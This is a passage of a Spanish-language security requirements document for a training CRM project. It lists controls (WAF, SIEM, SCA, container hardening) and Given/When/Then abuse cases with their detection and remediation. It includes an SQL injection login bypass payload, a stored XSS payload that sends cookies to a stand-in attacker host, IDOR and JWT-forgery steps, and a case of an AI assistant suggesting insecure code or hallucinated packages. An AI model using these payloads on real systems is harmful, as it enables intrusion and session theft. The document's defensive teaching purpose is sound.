| **RS-05** | **Gestión de vulnerabilidades en dependencias (SCA) e inventario SBOM:** Ninguna dependencia de producción debe mantener CVEs de severidad `high` o `critical` sin mitigación, y cada build debe generar un SBOM CycloneDX auditable. | **D / E** · Componentes vulnerables en cadena de suministro (`CWE-1395`, `V-09`). | **Pipeline (`SCA pnpm audit` + `SBOM Syft` + `SAST Semgrep`)** | **H2:** El job `sca` ejecuta `pnpm audit --prod --json` evaluando el umbral `high + critical == 0`, y el job `sbom` publica el artefacto `sbom.cdx.json` en cada push. |
| **RS-06** | **Restricción de métodos HTTP y ajuste quirúrgico de falsos positivos en el WAF:** El WAF solo debe permitir los métodos HTTP estrictamente requeridos por la API y cualquier falso positivo en flujos legítimos debe resolverse con la exclusión mínima por ruta/parámetro sin apagar el CRS. | **R / T** · Abuso de métodos HTTP no autorizados y bloqueo accidental de operaciones legítimas. | **SIEM Kibana (`DET-03`) + WAF (`ALLOWED_METHODS` y `REQUEST-900`)** | **H3:** `DET-03` (`ruleId : 911100`) registra peticiones `DELETE`/`PUT`; en modo `On`, se ajusta `ALLOWED_METHODS` en `.env` y se crean reglas `SecRule` tipo 1/2 en `REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf` comprobando que el ataque real sigue dando `403`. |
| **RS-07** | **Detección de ráfagas y fuerza bruta en el SIEM:** Todo incremento anómalo de peticiones por IP en ventanas de 1 minuto debe poder identificarse en Kibana mediante consultas agregadas. | **D / S** · Ataques de fuerza bruta, enumeración o escaneo automatizado con ZAP (`CWE-307`, `V-08`). | **SIEM Kibana (`Regla ES\|QL de Ráfagas` y `Dashboard WAF - Blue Team`)** | **H3:** Consulta ES\|QL agrupando por `modsec.transaction.client_ip` y `BUCKET(@timestamp, 1 minute)` con umbral `eventos > 20`, visualizada en el panel de origen e historial temporal del Dashboard de Kibana. |
| **RS-08** | **Endurecimiento de contenedores y aislamiento de red (No-Root & No-Bypass):** Los contenedores deben ejecutarse con un usuario sin privilegios (`USER node`) y el backend no debe quedar expuesto directamente fuera de la red del WAF en despliegues productivos. | **E** · Ejecución como `root` (`CWE-250`) y evasión del WAF por puerto `:4000` (`V-10`). | **Pipeline (`SAST Semgrep`) + Verificación Postman (`H0/H3`)** | **H2:** Semgrep detecta `dockerfile.security.missing-user` en `apps/api/Dockerfile` y `apps/web/Dockerfile`.<br>**H3/H4:** Documentación del riesgo de la Opción A vs. Opción B en `docs/hito-3/README.md` y adición de `USER node` en los Dockerfiles. |

---

## 6. Casos de Abuso (Formato Dado / Cuando / Entonces)

### CA-01 · Bypass de autenticación administrativa mediante Inyección SQL en el Login
- **Dado** que un atacante externo (Red Team) no posee credenciales válidas pero tiene acceso al endpoint `POST http://localhost:8080/api/auth/login` a través del WAF en modo `DetectionOnly`,
- **Cuando** envía en el cuerpo JSON el payload `{"username": "admin' OR '1'='1' --", "password": "cualquier_valor"}`,
- **Entonces** en la versión vulnerable la consulta SQL concatenada se evalúa como verdadera y devuelve un token JWT válido de `admin` (`HTTP 200`); sin embargo, el **WAF ModSecurity** dispara la familia de reglas `942*` (`DET-01` en Kibana), en modo `On` bloquea la petición con `HTTP 403 Forbidden`, y tras la remediación del código con consultas preparadas (`?`) en el Hito 4, el endpoint rechaza el login con `HTTP 401 Unauthorized` incluso con el WAF en `DetectionOnly`.

### CA-02 · Inyección de script malicioso persistente (XSS Almacenado) en un Ticket de Soporte
- **Dado** que un atacante autenticado con una cuenta de prueba (`jperez`) accede a la creación de tickets en `POST http://localhost:8080/api/tickets`,
- **Cuando** envía un ticket cuyo campo `description` o `title` contiene el payload `<img src=x onerror="fetch('http://atacante.local/steal?c='+document.cookie)">` (o `<script>alert(document.cookie)</script>`),
- **Entonces** en la versión vulnerable con el WAF en `DetectionOnly` el payload se almacena en SQLite y se ejecuta en el navegador de cualquier agente o administrador al abrir el ticket; pero el evento queda capturado en **Kibana** bajo la regla `DET-02 XSS` (`ruleId : 941*`), al activar el WAF en modo `On` la petición es bloqueada con `HTTP 403`, y en el Hito 4 la eliminación de `dangerouslySetInnerHTML` junto con la cabecera `Content-Security-Policy` impide la ejecución del script en el navegador.

### CA-03 · Acceso no autorizado a tickets de otros clientes (IDOR) y eliminación sin privilegios
- **Dado** que un usuario con rol restringido (`viewer` o un agente distinto al asignado) desea leer o eliminar tickets confidenciales pertenecientes a otros clientes en `/api/tickets/:id`,
- **Cuando** itera sobre los identificadores numéricos enviando `GET http://localhost:8080/api/tickets/1` o `DELETE http://localhost:8080/api/tickets/1`,
- **Entonces** en la versión vulnerable la API entrega los datos del ticket ajeno o lo elimina sin verificar propiedad ni rol `admin`; el intento `DELETE` es detectado en **Kibana** por la regla `DET-03` (`ruleId : 911100`), es bloqueado con `HTTP 403` por el WAF mientras `DELETE` no esté autorizado, y tras la remediación de control de acceso (RBAC) en el Hito 4, el propio backend devuelve `HTTP 403 Forbidden` ante usuarios sin el rol requerido.

### CA-04 · Escalada de privilegios mediante falsificación de Token JWT sin verificación de firma
- **Dado** que un atacante autenticado como `viewer` obtiene su token JWT legítimo y observa que el backend utiliza `jwt.decode()` en lugar de `jwt.verify()`,
- **Cuando** modifica la sección *payload* (Base64URL) del token cambiando `"role": "viewer"` a `"role": "admin"` con una firma inválida y solicita `GET http://localhost:8080/api/users`,
- **Entonces** la versión vulnerable le concede acceso administrativo y le expone la lista de usuarios con sus hashes MD5; pero una vez aplicada la remediación en `apps/api/src/middleware/auth.ts` (`jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] })`) en el Hito 4, cualquier alteración del payload invalida la firma criptográfica y la API rechaza la petición con `HTTP 401 Invalid token`.

### CA-05 · Evasión del WAF atacando directamente el puerto expuesto del Backend
- **Dado** que la aplicación se levanta en modo local (Opción A) publicando el puerto `4000` del contenedor `api` en la máquina host además del puerto `8080` del WAF,
- **Cuando** un atacante envía sus payloads de Inyección SQL o XSS directamente a `http://localhost:4000/api/auth/login` en lugar de `http://localhost:8080/api/auth/login`,
- **Entonces** la petición alcanza el backend Express sin pasar por el contenedor `waf` (`owasp/modsecurity-crs:nginx`), por lo que el ataque no genera registros en `modsec_audit.json` ni es bloqueado aunque `MODSEC_RULE_ENGINE=On` esté activo; este abuso demuestra por qué el aislamiento de red (Opción B en Docker Compose) y la remediación en el código fuente (Hito 4) son indispensables para no depender únicamente del WAF.

### CA-06 · Introducción de código inseguro o dependencias alucinadas (*Slopsquatting*) por Asistente de IA
- **Dado** que el equipo de desarrollo utiliza un asistente de IA generativa en el Hito 4 para parchar vulnerabilidades en el backend de Secure CRM,
- **Cuando** la IA sugiere instalar un paquete inexistente o malicioso en `package.json`, deja un secreto hardcodeado o mantiene una construcción insegura en TypeScript/Dockerfile,
- **Entonces** la auditoría obligatoria del Hito 4 (ejecución automática de **SAST Semgrep** y **SCA `pnpm audit`** en el pipeline de GitHub Actions, verificación de existencia real en el registro oficial de npm y revisión manual con la checklist de la Lectura 10) detecta y rechaza el cambio antes de integrarlo a la rama principal.
